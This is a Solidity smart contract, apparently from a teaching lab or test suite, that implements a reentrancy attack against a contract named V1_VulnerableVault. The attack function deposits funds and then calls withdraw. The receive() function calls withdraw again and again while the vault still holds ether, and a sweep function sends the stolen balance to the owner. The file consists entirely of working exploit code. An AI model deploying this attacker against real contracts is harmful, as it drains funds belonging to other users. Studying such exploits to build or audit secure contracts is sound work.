// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title V1_Attacker
/// @notice Reentrancy attacker against V1_VulnerableVault.
interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function totalAssets() external view returns (uint256);
}

contract V1_Attacker {
    IVulnerableVault public immutable VAULT;
    uint256 public immutable CHUNK;
    address public immutable OWNER;

    event AttackStarted(uint256 initialDeposit, uint256 chunk);
    event Reentered(uint256 vaultBalance);
    event AttackFinished(uint256 attackerBalance);

    constructor(address vault_, uint256 chunk_) {
        VAULT = IVulnerableVault(vault_);
        CHUNK = chunk_;
        OWNER = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == OWNER, "not owner");
        require(msg.value >= CHUNK, "need >= chunk");

        // Deposit first so we have balance in the vault.
        VAULT.deposit{value: msg.value}();
        emit AttackStarted(msg.value, CHUNK);

        // Trigger first withdraw; reentrancy happens in receive().
        VAULT.withdraw(CHUNK);

        emit AttackFinished(address(this).balance);
    }

    receive() external payable {
        // Re-enter while vault still thinks our balance is unchanged.
        uint256 vbal = address(VAULT).balance;
        emit Reentered(vbal);

        if (vbal >= CHUNK) {
            VAULT.withdraw(CHUNK);
        }
    }

    function sweep(address payable to) external returns (bool success) {
        require(msg.sender == OWNER, "not owner");
        (success, ) = to.call{value: address(this).balance}("");
        return success;
    }
}